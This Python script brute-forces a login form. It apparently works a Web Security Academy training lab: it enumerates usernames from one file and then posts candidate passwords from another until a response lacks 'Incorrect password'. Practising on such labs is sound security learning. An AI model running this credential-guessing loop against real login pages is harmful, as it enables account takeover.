import requests

users = []

with open('users.txt') as f:
    line = f.readline()
    while line:
        users.append(line.strip('\n'))
        line = f.readline()

passwords = []
with open('passwords.txt') as f:
    line = f.readline()
    while line:
        passwords.append(line.strip('\n'))
        line = f.readline()

url = 'https://0a890072041507ca822760640069000b.web-security-academy.net/login'
foundUsers = ['user']
# for user in users:
#     body = {'username':user,'password':'pass'}
#     r = requests.post(url,data=body)
#     if not 'Invalid username' in r.text:
#         print(f'Found user: {user}')
#         foundUsers.append(user)
for user in foundUsers:
    for password in passwords:
        body = {'username':'user','password':password}
        r = requests.post(url,data=body)
        if not 'Incorrect password' in r.text:
            print(f'Found creds: {user} {password}')
            break
        
